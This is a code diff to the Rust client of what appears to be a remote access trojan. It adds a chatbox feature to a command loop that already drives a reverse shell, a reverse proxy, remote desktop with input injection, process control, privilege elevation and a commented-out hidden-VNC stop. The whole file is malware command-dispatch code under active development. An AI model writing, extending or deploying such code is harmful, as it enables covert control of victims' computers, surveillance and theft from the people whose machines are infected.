@@ -1,4 +1,5 @@
-use crate::features::other::{visit_website, show_messagebox, elevate_client, system_commands, handle_input_command};
+use crate::features::other::{visit_website, elevate_client, system_commands};
+use crate::features::messaging::{messagebox::show_messagebox, inputbox::handle_input_command, chatbox::{ChatBoxState}};
 use crate::features::collectors::client_info;
 use crate::features::remote_desktop::{take_screenshot, start_remote_desktop, stop_remote_desktop, mouse_click, keyboard_input};
 use crate::features::process::{process_list, kill_process, start_process, suspend_process, resume_process};
@@ -31,10 +32,18 @@ pub async fn reading_loop(
     let mut reverse_proxy = ReverseProxy::new();
     let mut file_manager = FileManager::new();
     let mut reverse_shell_lock = REVERSE_SHELL.lock().unwrap();
+    let mut chatbox_state = ChatBoxState::new();
+    
+    // Don't initialize the chat system until needed
+    // chatbox_state.initialize();
+    
     'l: loop {
         match reader.read_packet(&secret, nonce_generator.as_mut()).await {
             Ok(Some(ClientboundPacket::InitClient)) => {
                 let client_info = client_info(config.group.clone()).await;
+                
+                // Don't initialize chat here
+                // println!("Initializing chat system...");
                 
                 match send_packet(ServerboundPacket::ClientInfo(client_info.clone())).await {
                     Ok(_) => println!("Sent client info to server"),
@@ -88,6 +97,16 @@ pub async fn reading_loop(
 
             Ok(Some(ClientboundPacket::ShowInputBox(input_box_data))) => handle_input_command(input_box_data),
 
+            Ok(Some(ClientboundPacket::SendChatMessage(message))) => {
+                println!("Received chat message: {}", message);
+                chatbox_state.add_message("Admin", &message);
+            },
+
+            Ok(Some(ClientboundPacket::StopChat)) => {
+                println!("Received StopChat command");
+                chatbox_state.close();
+            },
+
             Ok(Some(ClientboundPacket::ElevateClient)) => elevate_client(),
 
             Ok(Some(ClientboundPacket::StartRemoteDesktop(config))) => start_remote_desktop(config),
@@ -132,6 +151,7 @@ pub async fn reading_loop(
                 println!("Connection error: {}", e);
                 reverse_shell_lock.send_shell_command(b"exit");
                 reverse_proxy.stop().await;
+                chatbox_state.close();
                 stop_remote_desktop();
                 // stop_hvnc();
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
@@ -142,6 +162,7 @@ pub async fn reading_loop(
                 println!("Connection closed");
                 reverse_shell_lock.send_shell_command(b"exit");
                 reverse_proxy.stop().await;
+                chatbox_state.close();
                 stop_remote_desktop();
                 // stop_hvnc();
                 close_sender.send(()).unwrap_or_else(|_| println!("Failed to send close signal"));
